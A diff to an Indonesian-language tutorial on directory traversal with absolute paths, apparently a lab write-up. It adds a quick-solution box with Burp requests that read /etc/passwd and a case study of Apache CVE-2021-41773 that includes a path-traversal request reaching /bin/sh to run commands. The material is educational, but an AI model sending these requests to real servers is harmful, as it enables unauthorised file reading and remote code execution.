@@ -1,5 +1,19 @@
 # Directory Traversal: Bypassing dengan Absolute Path
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. Tangkap request pemanggilan gambar di Burp Repeater:
+>    ```http
+>    GET /image?filename=53.jpg HTTP/1.1
+>    ```
+> 2. Ganti nilai parameter `filename` langsung dengan Absolute Path ke file sistem:
+>    ```http
+>    GET /image?filename=/etc/passwd HTTP/1.1
+>    ```
+> 3. Klik **Send** $\rightarrow$ server mengembalikan status `200 OK` dan isi file `/etc/passwd`.
+
+---
+
 **Directory Traversal** (juga dikenal sebagai **File Path Traversal**) adalah kerentanan keamanan web yang memungkinkan penyerang membaca file arbitrer pada sistem operasi server tempat aplikasi dijalankan.
 
 Berkas yang dapat dibaca mencakup kode sumber aplikasi, berkas konfigurasi kredensial database (`.env`), hingga berkas sistem operasi yang sangat sensitif seperti `/etc/passwd` di Linux atau `C:\windows\win.ini` di Windows.
@@ -155,6 +169,20 @@ peter:x:1002:1002:Peter:/home/peter:/bin/bash
 3. Berkas sistem Linux berhasil dibaca dan lab selesai (*Solved*)! 🎉
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### Apache HTTP Server 2.4.49 Path Traversal & RCE (CVE-2021-41773)
+Kerentanan path traversal dengan absolute path pernah mengguncang infrastruktur web global pada server Apache:
+* **Akar Masalah:** Pada rilis Apache HTTP Server 2.4.49, terdapat perubahan logika normalisasi path. Jika direktori server tidak dikonfigurasi dengan proteksi ketat `Require all denied`, penyerang dapat memetakan URL langsung ke absolute path file di luar web root.
+* **Eksploitasi:** Penyerang mengirimkan request traversal langsung ke biner sistem Linux:
+  ```http
+  POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+  Content-Length: 7
+
+  echo; id
+  ```
+* **Dampak Global:** Kerentanan ini memiliki skor **CVSS 9.8 (CRITICAL)** karena tidak hanya membaca file sensitif seperti `/etc/passwd`, tetapi juga memungkinkan eksekusi kode perintah jarak jauh (*Remote Code Execution*) secara massal pada ribuan server di seluruh dunia.
 
 ## 6. Bedah Kode Backend: Rentan vs Aman
 
